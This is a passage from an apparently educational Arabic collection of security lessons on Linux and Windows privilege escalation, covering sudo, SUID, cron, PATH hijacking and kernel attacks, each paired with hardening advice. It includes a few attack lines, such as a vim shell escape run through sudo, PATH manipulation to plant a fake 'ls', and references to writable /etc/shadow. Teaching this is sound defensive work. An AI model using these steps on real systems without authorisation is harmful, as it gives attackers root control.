        <p>بعض الأدوات النظامية يمكن إساءة استخدامها لتنفيذ أوامر كـ root إذا كانت SUID مفعلة.</p>

        <h3>4. Cron Jobs</h3>

        <p>هي مهام مجدولة تعمل تلقائياً.</p>

        <p>إذا كان ملف cron قابل للكتابة:</p>

        <pre><code>/etc/crontab
/var/spool/cron</code></pre>

        <p>يمكن استغلاله.</p>

        <h3>5. Writable Files</h3>

        <p>إذا كانت ملفات النظام قابلة للكتابة من user:</p>

        <pre><code>/etc/passwd
/etc/shadow
/scripts/*.sh</code></pre>

        <h3>6. PATH Hijacking</h3>

        <p>إذا كان برنامج root ينفذ أوامر بدون مسار كامل:</p>

        <pre><code>export PATH=.:$PATH</code></pre>

        <p>يمكن استبدال أمر system ببرنامج خبيث.</p>

        <h3>7. Kernel Exploits</h3>

        <p>ثغرات في نواة Linux قد تسمح برفع الصلاحيات مباشرة إلى root.</p>

        <h3>فحص إصدار النظام:</h3>

        <pre><code>uname -r</code></pre>

        <h3>8. Environment Variables</h3>

        <p>بعض البرامج غير الآمنة تعتمد على متغيرات البيئة.</p>

        <h3>أمثلة على أدوات الفحص:</h3>

        <pre><code>linpeas
linux-exploit-suggester
pspy
lse.sh</code></pre>

        <h3>مراحل الهجوم:</h3>

        <p>1. الحصول على shell عادي.</p>
        <p>2. جمع معلومات النظام (Enumeration).</p>
        <p>3. البحث عن misconfigurations.</p>
        <p>4. استغلال الثغرة.</p>
        <p>5. التحول إلى root.</p>

        <h3>مثال على فحص النظام:</h3>

        <pre><code>whoami
id
sudo -l
uname -a</code></pre>

        <h3>Indicators of Misconfiguration:</h3>

        <p>1. sudo بدون كلمة مرور.</p>
        <p>2. SUID binaries غير معروفة.</p>
        <p>3. ملفات قابلة للكتابة من الجميع.</p>

        <h3>Example Exploitation Idea:</h3>

        <p>إذا كان برنامج يعمل كـ root ويستدعي أمر بدون path كامل:</p>

        <pre><code>system("ls")</code></pre>

        <p>يمكن استبدال ls ببرنامج خبيث.</p>

        <h3>طرق الحماية:</h3>

        <p><b>1. تقليل استخدام sudo.</b></p>
        <p><b>2. مراجعة SUID binaries.</b></p>
        <p><b>3. حماية ملفات cron.</b></p>
        <p><b>4. استخدام full paths في الأوامر.</b></p>
        <p><b>5. تحديث kernel باستمرار.</b></p>
        <p><b>6. تطبيق principle of least privilege.</b></p>

        <h3>Hardening Tips:</h3>

        <pre><code>chmod -s (remove SUID)
auditd monitoring
AppArmor / SELinux</code></pre>

        <h3>خطورة الثغرة:</h3>

        <p>تُعتبر Privilege Escalation في Linux من أخطر المراحل في أي اختراق، لأنها تحول المهاجم من مستخدم محدود إلى متحكم كامل في النظام، مما يسمح له بالسيطرة الكاملة على الخادم والبيانات.</p>
    `
},



{
    "title": "Linux Sudo Misconfiguration",
    "summary": `
        <p>تُعتبر <b>Sudo Misconfiguration</b> في Linux من أخطر مشاكل إعدادات الصلاحيات، حيث تحدث عندما يتم منح المستخدم صلاحيات sudo بشكل غير صحيح أو واسع أكثر من اللازم، مما قد يؤدي إلى <b>Privilege Escalation</b> والوصول إلى root.</p>

        <p>أداة sudo تُستخدم لتنفيذ أوامر بصلاحيات المستخدم الإداري (root) ولكن بشكل محدود ومتحكم فيه. أي خطأ في إعداداتها قد يفتح باباً لاختراق النظام بالكامل.</p>

        <h3>ما هو sudo ؟</h3>

        <p>هو أمر يسمح للمستخدم العادي بتنفيذ أوامر بصلاحيات root حسب قواعد محددة داخل ملف:</p>

        <pre><code>/etc/sudoers</code></pre>

        <h3>كيف تحدث الثغرة؟</h3>

        <p>تحدث عندما يتم منح المستخدم صلاحيات غير ضرورية مثل:</p>

        <p>1. السماح بتشغيل كل الأوامر بدون كلمة مرور.</p>
        <p>2. السماح بتشغيل برامج خطيرة بصلاحيات root.</p>
        <p>3. عدم تقييد الأوامر المسموحة بشكل صحيح.</p>

        <h3>فحص صلاحيات المستخدم:</h3>

        <pre><code>sudo -l</code></pre>

        <p>يعرض هذا الأمر كل الأوامر التي يمكن للمستخدم تنفيذها كـ root.</p>

        <h3>أخطر حالات Misconfiguration:</h3>

        <h3>1. ALL=(ALL) NOPASSWD:ALL</h3>

        <pre><code>username ALL=(ALL) NOPASSWD:ALL</code></pre>

        <p>هذا يعني أن المستخدم يمكنه تشغيل أي أمر كـ root بدون كلمة مرور.</p>

        <h3>2. السماح ببرامج قابلة للاستغلال</h3>

        <p>مثال:</p>

        <pre><code>username ALL=(root) NOPASSWD: /usr/bin/vim</code></pre>

        <p>إذا كان البرنامج يمكن استخدامه بطريقة غير آمنة، يمكن استغلاله لتنفيذ أوامر.</p>

        <h3>3. السماح بأوامر بدون تحديد خيارات آمنة</h3>

        <p>مثل السماح بتشغيل bash أو python بصلاحيات root:</p>

        <pre><code>username ALL=(root) NOPASSWD: /bin/bash</code></pre>

        <h3>كيف يتم الاستغلال (مفاهيمياً)؟</h3>

        <p>المهاجم يبحث عن برامج مسموح بها في sudo يمكن استخدامها لتشغيل أوامر النظام أو فتح shell.</p>

        <h3>مثال على خطورة البرامج:</h3>

        <p>بعض الأدوات النظامية يمكن إساءة استخدامها مثل:</p>

        <pre><code>vim
nano
less
awk
find
python
perl</code></pre>

        <h3>فكرة الاستغلال العامة:</h3>

        <p>إذا كان برنامج يعمل بصلاحيات root يمكنه تنفيذ أوامر خارج نطاقه، يمكن للمهاجم استغلاله للحصول على shell.</p>

        <h3>GTFOBins Concept:</h3>

        <p>هو مرجع يوضح كيف يمكن إساءة استخدام أدوات Linux المسموح بها للحصول على تنفيذ أوامر غير مصرح بها عندما تكون ضمن sudo.</p>

        <h3>مثال خطير:</h3>

        <pre><code>sudo vim -c ':!/bin/sh'</code></pre>

        <p>في حال عدم تقييد vim، يمكن فتح shell بصلاحيات root.</p>

        <h3>أخطاء شائعة في sudoers:</h3>

        <p>1. استخدام ALL بشكل مفرط.</p>
        <p>2. عدم تحديد المسارات الكاملة للأوامر.</p>
        <p>3. السماح ببرامج تفاعلية غير آمنة.</p>
        <p>4. عدم مراجعة sudoers بشكل دوري.</p>

        <h3>ملف sudoers:</h3>

        <pre><code>/etc/sudoers</code></pre>

        <p>ويجب تعديله باستخدام:</p>

        <pre><code>visudo</code></pre>

        <h3>أدوات الفحص:</h3>

        <pre><code>sudo -l
linpeas
lse.sh
linux-exploit-suggester</code></pre>

        <h3>علامات وجود الثغرة:</h3>

        <p>1. وجود NOPASSWD:ALL.</p>
        <p>2. وجود برامج غير مقيدة في sudo.</p>
        <p>3. إمكانية تشغيل shell عبر sudo.</p>

        <h3>طرق الحماية:</h3>

        <p><b>1. تطبيق مبدأ أقل صلاحية (Least Privilege).</b></p>

        <p><b>2. تجنب استخدام ALL في sudoers.</b></p>

        <p><b>3. تحديد الأوامر بدقة.</b></p>

        <p><b>4. استخدام visudo دائماً للتعديل.</b></p>

        <p><b>5. مراجعة الصلاحيات بشكل دوري.</b></p>

        <p><b>6. تجنب منح صلاحيات لبرامج تفاعلية.</b></p>

        <h3>Hardening Example:</h3>

        <pre><code>username ALL=(root) /usr/bin/systemctl restart nginx</code></pre>

        <p>هذا مثال آمن لأنه يحدد أمر واحد فقط.</p>

        <h3>خطورة الثغرة:</h3>

        <p>تُعتبر Sudo Misconfiguration من أخطر مشاكل Linux لأنها غالباً تؤدي مباشرة إلى Privilege Escalation ومن ثم السيطرة الكاملة على النظام إذا تم منح صلاحيات غير مقيدة أو تم السماح ببرامج قابلة للاستغلال.</p>
    `
},




{
    "title": "SUID Binary Exploitation",
    "summary": `
        <p>تُعتبر <b>SUID Binary Exploitation</b> من أشهر طرق <b>Privilege Escalation</b> في Linux، وتحدث عندما يتم استغلال ملفات تعمل بصلاحيات مالكها (غالباً root) حتى لو تم تشغيلها من مستخدم عادي.</p>

        <p>إذا كان ملف SUID غير آمن أو يحتوي على سلوك يسمح بتنفيذ أوامر غير مقيدة، يمكن أن يؤدي ذلك إلى الحصول على صلاحيات root.</p>

        <h3>ما هو SUID ؟</h3>

        <p><b>SUID (Set User ID)</b> هو permission خاص في Linux يسمح بتشغيل الملف بصلاحيات مالك الملف بدلاً من المستخدم الذي يشغله.</p>

        <pre><code>rwsr-xr-x</code></pre>

        <p>الحرف <b>s</b> يدل على وجود SUID.</p>

        <h3>كيف يعمل SUID ؟</h3>

        <p>عند تشغيل برنامج SUID:</p>

        <p>1. يتم تنفيذ البرنامج بصلاحيات مالكه (root غالباً).</p>
        <p>2. حتى لو كان المستخدم عادي.</p>
        <p>3. هذا يسمح بعمليات حساسة داخل النظام.</p>

        <h3>كيفية العثور على ملفات SUID:</h3>

        <pre><code>find / -perm -4000 2>/dev/null</code></pre>

        <p>يعرض جميع الملفات التي تعمل بصلاحية SUID.</p>

        <h3>لماذا SUID خطير؟</h3>

        <p>لأنه إذا كان الملف يحتوي على ثغرة أو سلوك يسمح بتنفيذ أوامر النظام، يمكن تشغيل هذه الأوامر بصلاحيات root.</p>

        <h3>أمثلة على برامج SUID الشائعة:</h3>

        <pre><code>passwd
mount
sudo
find
vim
bash (misconfigured)</code></pre>

        <h3>كيف يتم الاستغلال (مفاهيمياً)؟</h3>

        <p>المهاجم يبحث عن برنامج SUID يمكن إساءة استخدامه لتنفيذ أوامر النظام أو فتح shell.</p>

        <h3>مثال خطير:</h3>

        <pre><code>-rwsr-xr-x root root /usr/bin/vim</code></pre>

        <p>إذا لم يتم تقييد vim، يمكن تشغيل أوامر داخل shell بصلاحيات root.</p>

        <h3>GTFOBins Concept:</h3>

        <p>بعض الأدوات المسموحة في Linux يمكن استخدامها بشكل غير مقصود للحصول على shell إذا كانت SUID مفعلة.</p>

        <h3>أخطاء شائعة تؤدي للثغرة:</h3>

        <p>1. وضع SUID على برامج غير ضرورية.</p>
        <p>2. استخدام برامج قابلة للتفاعل (interactive).</p>
        <p>3. عدم مراجعة صلاحيات الملفات.</p>
        <p>4. وجود برامج مخصصة أو scripts تعمل كـ root.</p>

        <h3>مثال على سكربت خطير:</h3>

        <pre><code>#!/bin/bash
system("ls");</code></pre>

        <p>إذا كان هذا الملف SUID يمكن استغلاله.</p>

        <h3>Exploitation Idea (مفاهيمي):</h3>

        <p>المهاجم يستغل برنامج SUID ليجبره على تنفيذ أوامر shell بدلاً من وظيفته الأصلية.</p>

        <h3>أنواع SUID Exploitation:</h3>

        <p>1. Path Hijacking.</p>
        <p>2. Command Injection داخل البرنامج.</p>
        <p>3. Misuse of built-in features.</p>
        <p>4. Abusing interactive binaries.</p>

        <h3>مثال PATH Exploitation:</h3>

        <p>إذا كان برنامج SUID يستدعي أوامر بدون مسار كامل:</p>

        <pre><code>system("ls")</code></pre>

        <p>يمكن استبدال ls ببرنامج خبيث.</p>

        <h3>فحص صلاحيات SUID:</h3>

        <pre><code>ls -la /usr/bin
find / -perm -4000</code></pre>

        <h3>أدوات التحليل:</h3>

        <pre><code>linpeas
lse.sh
GTFOBins
strings
gdb</code></pre>

        <h3>علامات وجود الثغرة:</h3>

        <p>1. وجود SUID على برامج غير معتادة.</p>
        <p>2. برامج SUID تسمح بتنفيذ أوامر shell.</p>
        <p>3. إمكانية تعديل أو استغلال سلوك البرنامج.</p>

        <h3>طرق الحماية:</h3>

        <p><b>1. تقليل استخدام SUID قدر الإمكان.</b></p>

        <p><b>2. مراجعة جميع SUID binaries بشكل دوري.</b></p>

        <p><b>3. إزالة SUID من البرامج غير الضرورية:</b></p>

        <pre><code>chmod u-s file</code></pre>

        <p><b>4. استخدام برامج بديلة أكثر أماناً.</b></p>

        <p><b>5. تطبيق مبدأ أقل صلاحية (Least Privilege).</b></p>

        <p><b>6. تحديث النظام باستمرار.</b></p>

        <h3>Hardening Example:</h3>

        <pre><code>chmod u-s /usr/bin/vulnerable_app</code></pre>

        <h3>خطورة الثغرة:</h3>

        <p>تُعتبر SUID Binary Exploitation من أهم طرق Privilege Escalation لأنها تعتمد على صلاحيات مرتفعة موجودة مسبقاً في النظام، وإذا تم استغلالها بشكل صحيح يمكن أن تؤدي إلى الحصول على root والتحكم الكامل في الجهاز.</p>
    `
},




{
    "title": "Cron Job Privilege Escalation",
    "summary": `
        <p>تُعتبر <b>Cron Job Privilege Escalation</b> من أساليب رفع الصلاحيات في Linux، وتحدث عندما يتم استغلال مهام مجدولة (Cron Jobs) تعمل بصلاحيات مرتفعة (غالباً root) ولكنها تحتوي على إعدادات غير آمنة أو ملفات قابلة للتعديل من المستخدمين العاديين.</p>

        <p>الفكرة الأساسية أن cron يقوم بتنفيذ أوامر تلقائياً في أوقات محددة، وإذا كانت هذه الأوامر أو الملفات التي يعتمد عليها قابلة للتعديل، يمكن استغلالها للحصول على صلاحيات أعلى.</p>

        <h3>ما هو Cron ؟</h3>

        <p>Cron هو خدمة في Linux تستخدم لتنفيذ أوامر بشكل دوري أو مجدول.</p>

        <pre><code>crontab -l</code></pre>

        <p>يعرض المهام المجدولة للمستخدم الحالي.</p>

        <h3>ملفات Cron المهمة:</h3>

        <pre><code>/etc/crontab
/etc/cron.d/
/etc/cron.daily/
/etc/cron.hourly/
/var/spool/cron/</code></pre>

        <h3>كيف تحدث الثغرة؟</h3>

        <p>تحدث عندما:</p>

        <p>1. يكون ملف cron script قابل للكتابة من مستخدم عادي.</p>
        <p>2. أو يتم تشغيل script بصلاحيات root.</p>
        <p>3. أو يتم استدعاء أوامر بدون مسار كامل.</p>

        <h3>مثال على Cron Job:</h3>

        <pre><code>* * * * * root /usr/local/bin/backup.sh</code></pre>

        <p>هذا يعني أن السكربت يتم تشغيله كل دقيقة بصلاحيات root.</p>

        <h3>خطورة السكربت:</h3>

        <p>إذا كان الملف <code>backup.sh</code> قابل للتعديل، يمكن للمهاجم تغييره.</p>

        <h3>مثال سكربت ضعيف:</h3>

        <pre><code>#!/bin/bash
cp /home/user/data /backup/</code></pre>

        <h3>إذا كان قابلاً للكتابة:</h3>

        <p>يمكن إدخال أوامر خبيثة داخله.</p>

        <h3>أنواع الاستغلال:</h3>

        <h3>1. Writable Cron Script</h3>

        <p>إذا كان السكربت الذي يتم تشغيله بواسطة root قابل للتعديل:</p>

        <pre><code>chmod 777 backup.sh</code></pre>

        <p>هذه حالة خطيرة جداً.</p>

        <h3>2. PATH Hijacking داخل Cron</h3>

        <p>إذا كان cron يستخدم أوامر بدون مسار كامل:</p>

        <pre><code>rm -rf /tmp/*</code></pre>

        <p>يمكن استبدال الأمر بملف خبيث.</p>

        <h3>3. Wildcard Injection</h3>

        <p>بعض cron jobs تستخدم wildcards بشكل غير آمن:</p>

        <pre><code>tar -cf backup.tar *</code></pre>

        <h3>4. Environment Variables Abuse</h3>

        <p>cron يعمل ببيئة محدودة، لكن بعض الإعدادات الخاطئة تسمح باستغلال متغيرات البيئة.</p>

        <h3>كيفية فحص Cron Jobs:</h3>

        <pre><code>crontab -l
ls -la /etc/cron*
cat /etc/crontab</code></pre>

        <h3>أخطر الحالات:</h3>

        <p>1. Cron job يعمل كـ root.</p>
        <p>2. سكربت قابل للكتابة من الجميع.</p>
        <p>3. استخدام أوامر بدون full path.</p>

        <h3>Example Exploitation Idea (مفاهيمي):</h3>

        <p>إذا كان cron يشغل سكربت قابل للتعديل، يمكن للمهاجم إدخال أمر داخل السكربت ليتم تنفيذه تلقائياً بصلاحيات root.</p>

        <h3>مثال خطير:</h3>

        <pre><code>* * * * * root /tmp/script.sh</code></pre>

        <p>إذا كان /tmp/script.sh قابل للتعديل، فهذا خطر كبير.</p>

        <h3>علامات وجود الثغرة:</h3>

        <p>1. ملفات cron قابلة للكتابة.</p>
        <p>2. سكربتات تعمل كـ root داخل cron.</p>
        <p>3. استخدام مسارات غير آمنة.</p>

        <h3>أدوات التحليل:</h3>

        <pre><code>linpeas
pspy
lse.sh
cat /etc/crontab</code></pre>

        <h3>لماذا pspy مهم؟</h3>

        <p>لأنه يراقب العمليات الجارية ويكشف cron jobs حتى بدون صلاحيات root.</p>

        <h3>طرق الحماية:</h3>

        <p><b>1. عدم جعل سكربتات cron قابلة للكتابة.</b></p>

        <p><b>2. استخدام full paths في جميع الأوامر.</b></p>

        <p><b>3. حماية ملفات /etc/crontab.</b></p>

        <p><b>4. تقليل تشغيل cron بصلاحيات root.</b></p>

        <p><b>5. مراجعة المهام المجدولة بشكل دوري.</b></p>

        <p><b>6. استخدام مبدأ أقل صلاحية (Least Privilege).</b></p>

        <h3>Hardening Example:</h3>

        <pre><code>/usr/bin/rsync -a /home /backup</code></pre>

        <p>استخدام مسارات كاملة يقلل مخاطر الاستغلال.</p>

        <h3>خطورة الثغرة:</h3>

        <p>تُعتبر Cron Job Privilege Escalation خطيرة جداً لأنها تستغل عمليات تلقائية تعمل بصلاحيات مرتفعة، وإذا تم استغلالها يمكن للمهاجم الحصول على root بشكل مستمر وصامت دون إثارة انتباه.</p>
    `
},



{
    "title": "PATH Hijacking في Linux",
    "summary": `
        <p>تُعتبر <b>PATH Hijacking</b> من تقنيات <b>Privilege Escalation</b> في Linux، وتحدث عندما يتم استغلال طريقة بحث النظام عن الأوامر التنفيذية عبر متغير البيئة PATH بشكل غير آمن.</p>

        <p>إذا كان برنامج يعمل بصلاحيات مرتفعة (مثل root) ينفذ أوامر بدون استخدام المسار الكامل، يمكن للمهاجم خداع النظام لتشغيل برنامج خبيث بدلاً من الأمر الأصلي.</p>

        <h3>ما هو PATH ؟</h3>

        <p>PATH هو متغير بيئة (Environment Variable) يحدد المجلدات التي يبحث فيها النظام عن الأوامر.</p>

        <pre><code>echo $PATH</code></pre>

        <p>مثال:</p>

        <pre><code>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/bin</code></pre>

        <h3>كيف يعمل النظام؟</h3>

        <p>عند كتابة أمر مثل:</p>

        <pre><code>ls</code></pre>

        <p>يقوم النظام بالبحث عنه داخل المجلدات الموجودة في PATH بالترتيب.</p>

        <h3>كيف تحدث الثغرة؟</h3>

        <p>تحدث عندما يقوم برنامج يعمل بصلاحيات root باستدعاء أوامر بدون مسار كامل مثل:</p>

        <pre><code>system("ls");</code></pre>

        <p>بدلاً من:</p>

        <pre><code>/bin/ls</code></pre>

        <h3>الفكرة الأساسية للهجوم:</h3>

        <p>المهاجم يقوم بإنشاء برنامج بنفس اسم الأمر الأصلي (مثل ls) داخل مجلد يتم وضعه في بداية PATH.</p>

        <h3>مثال على السيناريو:</h3>

        <p>إذا كان PATH يحتوي على:</p>

        <pre><code>.:/usr/local/bin:/usr/bin:/bin</code></pre>

        <p>فإن النظام سيبحث أولاً في المجلد الحالي (.).</p>

        <h3>إنشاء ملف خبيث:</h3>

        <pre><code>touch ls
chmod +x ls</code></pre>

        <p>ويتم وضعه في مجلد يتم استدعاؤه قبل النظام الأصلي.</p>

        <h3>لماذا هذا خطير؟</h3>

        <p>لأن البرنامج الخبيث سيتم تشغيله بصلاحيات البرنامج الأصلي (root في بعض الحالات).</p>

        <h3>مثال على كود ضعيف:</h3>

        <pre><code>system("backup");</code></pre>

        <p>إذا لم يتم استخدام المسار الكامل، يمكن استبدال backup.</p>

        <h3>أنواع PATH Hijacking:</h3>

        <h3>1. Current Directory Hijacking</h3>

        <p>إضافة "." إلى PATH بحيث يتم تنفيذ الملفات المحلية أولاً.</p>

        <h3>2. Writable Directory Hijacking</h3>

        <p>إذا كان هناك مجلد في PATH قابل للكتابة من المستخدم.</p>

        <h3>3. Script Hijacking</h3>

        <p>استبدال أوامر تستخدم داخل scripts تعمل بصلاحيات root.</p>

        <h3>4. Cron / Sudo Context Hijacking</h3>

        <p>إذا تم تنفيذ الأوامر عبر cron jobs أو sudo بدون full path.</p>

        <h3>مثال خطير:</h3>

        <pre><code>export PATH=.:$PATH</code></pre>

        <p>هذا يجعل النظام يبحث في المجلد الحالي أولاً.</p>

        <h3>Exploitation Idea (مفاهيمي):</h3>

        <p>المهاجم يستغل برنامج يعمل بصلاحيات عالية ويقوم بإجباره على تنفيذ أمر مزيف من PATH المعدل.</p>

        <h3>أمثلة على أوامر مستهدفة:</h3>

        <pre><code>ls
cp
mv
tar
rm
service
systemctl</code></pre>

        <h3>أخطر حالة:</h3>

        <p>إذا كان برنامج root ينفذ أوامر بدون full path داخل سكربت:</p>

        <pre><code>backup.sh</code></pre>

        <p>ويحتوي على:</p>

        <pre><code>tar -cf backup.tar *</code></pre>

        <h3>علامات وجود الثغرة:</h3>

        <p>1. استخدام أوامر بدون full path.</p>
        <p>2. وجود writable directories في PATH.</p>
        <p>3. سكربتات تعمل كـ root وتستدعي أوامر مباشرة.</p>

        <h3>فحص PATH:</h3>

        <pre><code>echo $PATH
env | grep PATH</code></pre>

        <h3>أدوات التحليل:</h3>

        <pre><code>linpeas
lse.sh
pspy
strings</code></pre>

        <h3>طرق الحماية:</h3>

        <p><b>1. استخدام full paths دائماً:</b></p>

        <pre><code>/bin/ls
/usr/bin/tar</code></pre>

        <p><b>2. عدم إضافة "." إلى PATH.</b></p>

        <p><b>3. تنظيف متغير PATH في السكربتات.</b></p>

        <p><b>4. تحديد PATH آمن داخل scripts:</b></p>

        <pre><code>export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/bin</code></pre>

        <p><b>5. تقليل صلاحيات المستخدمين.</b></p>

        <p><b>6. مراجعة cron و sudo scripts.</b></p>

        <h3>Hardening Example:</h3>

        <pre><code>command="/bin/ls"</code></pre>

        <h3>خطورة الثغرة:</h3>

        <p>تُعتبر PATH Hijacking خطيرة لأنها تعتمد على سلوك أساسي في نظام Linux، وإذا تم استغلالها في سياق root يمكن أن تؤدي مباشرة إلى Privilege Escalation والسيطرة الكاملة على النظام.</p>
    `
},




{
    "title": "Kernel Exploitation Basics",
    "summary": `
        <p>تُعتبر <b>Kernel Exploitation</b> من أخطر مجالات الثغرات في أنظمة Linux، لأنها تستهدف نواة النظام (Kernel) مباشرة، وهي الطبقة التي تتحكم بكل شيء في الجهاز مثل الذاكرة، العمليات، الصلاحيات، والأجهزة.</p>

        <p>إذا نجح المهاجم في استغلال ثغرة في الكيرنل، يمكنه غالباً الحصول على صلاحيات <b>root</b> أو حتى التحكم الكامل بالنظام.</p>

        <h3>ما هو Kernel ؟</h3>

        <p>الـ Kernel هو قلب نظام التشغيل، ويعمل كوسيط بين العتاد (Hardware) والبرامج.</p>

        <h3>مهامه الأساسية:</h3>

        <p>1. إدارة الذاكرة (Memory Management).</p>
        <p>2. إدارة العمليات (Process Management).</p>
        <p>3. التحكم في الصلاحيات (Permissions).</p>
        <p>4. التعامل مع الأجهزة (Drivers).</p>

        <h3>ما هي Kernel Exploitation ؟</h3>

        <p>هي استغلال ثغرات في نواة النظام تؤدي إلى:</p>

        <p>1. رفع الصلاحيات إلى root.</p>
        <p>2. تنفيذ كود داخل kernel space.</p>
        <p>3. تعطيل الحماية الأمنية.</p>

        <h3>لماذا تعتبر خطيرة جداً؟</h3>

        <p>لأن الكيرنل يعمل في أعلى مستوى صلاحيات في النظام، وأي خطأ فيه يمكن أن يؤدي إلى:</p>

        <p>1. انهيار النظام (Kernel Panic).</p>
        <p>2. السيطرة الكاملة على الجهاز.</p>
        <p>3. تجاوز جميع قيود المستخدمين.</p>

        <h3>مستويات الذاكرة:</h3>

        <pre><code>User Space  → تطبيقات المستخدم
Kernel Space → نواة النظام</code></pre>

        <p>الهجمات تستهدف الانتقال من User Space إلى Kernel Space.</p>

        <h3>كيف تحدث Kernel Vulnerabilities ؟</h3>

        <p>تحدث بسبب أخطاء في:</p>

        <p>1. Drivers.</p>
        <p>2. Memory handling.</p>
        <p>3. System calls (syscalls).</p>
        <p>4. Race conditions داخل kernel.</p>

        <h3>أنواع Kernel Exploits:</h3>

        <p>1. <b>Memory Corruption in Kernel</b></p>
        <p>2. <b>Use-After-Free in Kernel</b></p>
        <p>3. <b>Buffer Overflow in Kernel</b></p>
        <p>4. <b>Privilege Escalation Bugs</b></p>
        <p>5. <b>Race Conditions</b></p>

        <h3>مثال مفاهيمي:</h3>

        <p>إذا كان هناك دالة kernel لا تتحقق من حجم الإدخال:</p>

        <pre><code>copy_from_user(kernel_buffer, user_buffer, size);</code></pre>

        <p>إذا كان <code>size</code> غير صحيح قد يؤدي إلى corruption.</p>

        <h3>ما هو Privilege Escalation عبر Kernel؟</h3>

        <p>هو تحويل مستخدم عادي إلى root عن طريق استغلال kernel bug.</p>

        <h3>مراحل الاستغلال (High Level):</h3>

        <p>1. العثور على ثغرة في kernel.</p>
        <p>2. استغلال memory corruption أو logic bug.</p>
        <p>3. تعديل بيانات kernel (cred structures).</p>
        <p>4. رفع الصلاحيات إلى root.</p>

        <h3>Kernel Structures المستهدفة:</h3>

        <p>1. task_struct</p>
        <p>2. cred structure</p>
        <p>3. file_operations</p>

        <h3>مثال فكرة استغلال:</h3>

        <pre><code>cred->uid = 0;
cred->gid = 0;</code></pre>

        <p>هذا يجعل العملية تعمل بصلاحيات root.</p>

        <h3>أشهر أسباب الثغرات:</h3>

        <p>1. عدم التحقق من input في syscalls.</p>
        <p>2. أخطاء في drivers.</p>
        <p>3. إدارة غير آمنة للذاكرة.</p>
        <p>4. race conditions داخل kernel.</p>

        <h3>أدوات التحليل:</h3>

        <pre><code>gdb (with kernel debugging)
qemu
kgdb
dmesg
kernel logs</code></pre>

        <h3>فحص النظام:</h3>

        <pre><code>uname -r
cat /proc/version</code></pre>

        <h3>الحماية الحديثة:</h3>

        <p>1. KASLR (Kernel ASLR)</p>
        <p>2. SMEP (Supervisor Mode Execution Prevention)</p>
        <p>3. SMAP (Supervisor Mode Access Prevention)</p>
        <p>4. Stack Canaries</p>
        <p>5. Kernel Lockdown Mode</p>

        <h3>Kernel Exploit Flow:</h3>

        <p>1. Identify vulnerability.</p>
        <p>2. Leak kernel addresses.</p>
        <p>3. Bypass protections (KASLR).</p>
        <p>4. Corrupt kernel memory.</p>
        <p>5. Gain root privileges.</p>

        <h3>Example Attack Impact:</h3>

        <p>1. Full system takeover.</p>
        <p>2. Disable security modules.</p>
        <p>3. Hide processes (rootkits).</p>
        <p>4. Persistent backdoors.</p>

        <h3>طرق الحماية:</h3>

        <p><b>1. تحديث kernel باستمرار.</b></p>
        <p><b>2. تقليل drivers غير الضرورية.</b></p>
        <p><b>3. تفعيل security modules (SELinux/AppArmor).</b></p>
        <p><b>4. استخدام hardened kernels.</b></p>
        <p><b>5. مراقبة kernel logs.</b></p>

        <h3>خطورة Kernel Exploitation:</h3>

        <p>تُعتبر Kernel Exploitation من أخطر أنواع الثغرات في Linux لأنها تستهدف قلب النظام مباشرة، وإذا تم استغلالها بنجاح فإنها تمنح المهاجم سيطرة كاملة على الجهاز بدون أي قيود تقريباً.</p>
    `
},



{
    "title": "Windows Privilege Escalation",
    "summary": `
        <p>تُعتبر <b>Windows Privilege Escalation</b> من أهم مراحل الهجوم في أنظمة Windows، حيث يحاول المهاجم الانتقال من مستخدم محدود الصلاحيات (Low Privilege User) إلى حساب إداري مثل <b>Administrator</b> أو <b>NT AUTHORITY\\SYSTEM</b>.</p>

        <p>بمجرد الوصول إلى SYSTEM، يصبح المهاجم قادراً على التحكم الكامل في النظام: تثبيت برامج، قراءة الملفات الحساسة، تعديل إعدادات النظام، وإنشاء مستخدمين جدد.</p>

        <h3>ما هو Privilege Escalation ؟</h3>

        <p>هو استغلال ثغرات أو إعدادات خاطئة لرفع صلاحيات المستخدم داخل النظام.</p>

        <h3>أنواع Privilege Escalation:</h3>

        <p>1. <b>Vertical Privilege Escalation:</b> من مستخدم عادي إلى Admin/SYSTEM.</p>
        <p>2. <b>Horizontal Privilege Escalation:</b> الوصول إلى حساب مستخدم آخر بنفس المستوى.</p>

        <h3>كيف يحدث في Windows ؟</h3>

        <p>غالباً يحدث بسبب:</p>

        <p>1. Service misconfiguration.</p>
        <p>2. Weak file permissions.</p>
        <p>3. Registry misconfiguration.</p>
        <p>4. Scheduled Tasks.</p>
        <p>5. Unquoted service paths.</p>
        <p>6. Stored credentials.</p>

        <h3>1. Service Misconfiguration</h3>

        <p>إذا كان هناك خدمة تعمل بصلاحيات SYSTEM ويمكن تعديل ملفها التنفيذي:</p>

        <pre><code>sc qc service_name</code></pre>

        <p>قد يؤدي ذلك إلى استبدال الملف وتنفيذ كود بصلاحيات عالية.</p>

        <h3>2. Unquoted Service Paths</h3>

        <p>إذا كان مسار الخدمة يحتوي على مسافات بدون علامات اقتباس:</p>

        <pre><code>C:\\Program Files\\App\\service.exe</code></pre>

        <p>قد يسمح النظام بتنفيذ ملف خبيث في مسار خاطئ.</p>

        <h3>3. Weak File Permissions</h3>

        <p>إذا كانت ملفات البرامج أو الخدمات قابلة للكتابة من المستخدم العادي:</p>

        <pre><code>icacls "C:\\Program Files\\App"</code></pre>

        <p>يمكن استبدال الملفات التنفيذية.</p>

        <h3>4. Registry Misconfiguration</h3>

        <p>سجل النظام (Registry) قد يحتوي على إعدادات قابلة للتعديل تؤثر على الخدمات أو البرامج.</p>

        <pre><code>reg query HKLM
regedit</code></pre>

        <h3>5. Scheduled Tasks</h3>

        <p>المهام المجدولة قد تعمل بصلاحيات SYSTEM:</p>

        <pre><code>schtasks /query /fo LIST /v</code></pre>

        <p>إذا كان الملف المرتبط بها قابل للتعديل يمكن استغلاله.</p>

        <h3>6. Stored Credentials</h3>

        <p>أحياناً يتم تخزين كلمات مرور داخل النظام أو ملفات إعدادات:</p>

        <pre><code>cmdkey /list</code></pre>

        <h3>7. DLL Hijacking</h3>

        <p>إذا كان برنامج يبحث عن DLL في مسارات غير آمنة، يمكن استبدالها بملف خبيث.</p>

        <h3>8. Token Impersonation</h3>

        <p>في بعض الحالات يمكن سرقة أو انتحال رموز الوصول (Access Tokens) الخاصة بعمليات SYSTEM.</p>

        <h3>فحص النظام:</h3>

        <pre><code>whoami
whoami /priv
systeminfo
net user</code></pre>

        <h3>أدوات التحليل:</h3>

        <pre><code>winPEAS
Seatbelt
PowerUp
